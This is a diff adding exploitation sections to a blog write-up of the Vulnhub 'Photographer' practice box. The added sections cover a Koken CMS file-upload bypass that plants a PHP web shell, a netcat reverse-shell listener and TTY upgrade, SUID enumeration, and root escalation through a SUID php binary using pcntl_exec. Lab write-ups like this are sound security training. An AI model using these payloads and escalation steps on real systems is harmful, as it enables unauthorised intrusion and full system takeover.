@@ -3,7 +3,7 @@ title: Vulnhub - Photographer
 description: My writeup on Photographer box.
 categories:
  - vulnhub
-tags: vulnhub smb
+tags: vulnhub smb koken php SUID
 ---
 
 ![](https://i.imgur.com/9KCQ8Re.png)
@@ -97,3 +97,69 @@ Don't forget your secret, my babygirl ;)
 About `wordpress.bkp.zip` seems useless.
 
 Let's enumerate now port `8000` in the end we can see this: "Built with Koken" Let's search for possible exploits on koken.
+
+This one seems good [exploit](https://www.exploit-db.com/exploits/48706){:target="_blank"}
+
+## Koken exploitation - shell as www-data
+
+I searched for the admin panel location it's under `/admin` and we can login as `daisa@photographer.com:babygirl`
+
+![](https://i.imgur.com/vZtUKv7.png)
+
+Now simply we can follow the PoC, i used a php reverse shell instead of this `<?php system($_GET['cmd']);?>`
+
+I renamed it:
+
+```
+$ mv shell.php shell.php.jpg
+```
+
+Now let's upload it and capture the request with burp & change the shell.php.jpg to shell.php:
+
+![](https://i.imgur.com/ybn6Oje.png)
+
+We have shell!
+
+```
+$ nc -lvp 6666
+listening on [any] 6666 ...
+$ python3 -c 'import pty; pty.spawn("/bin/bash")'
+www-data@photographer:/$ ^Z
+[1]+  Stopped                 nc -lvp 6666
+$ stty raw -echo
+
+www-data@photographer:/$ 
+```
+
+## www-data -> root
+
+Now privesc to root is simple, let's search for SUID files.
+
+```
+www-data@photographer:/$ find / -uid 0 -perm -4000 -type f 2>/dev/null
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/xorg/Xorg.wrap
+/usr/lib/snapd/snap-confine
+/usr/lib/openssh/ssh-keysign
+/usr/lib/x86_64-linux-gnu/oxide-qt/chrome-sandbox
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/sbin/pppd
+/usr/bin/pkexec
+/usr/bin/passwd
+/usr/bin/newgrp
+/usr/bin/gpasswd
+/usr/bin/php7.2 <---
+```
+
+We can run php as root perfect.
+
+```
+www-data@photographer:/$ /usr/bin/php7.2 -r "pcntl_exec('/bin/sh', ['-p']);"
+# whoami;id
+root
+uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)
+```
+
+Cool box! :D
+
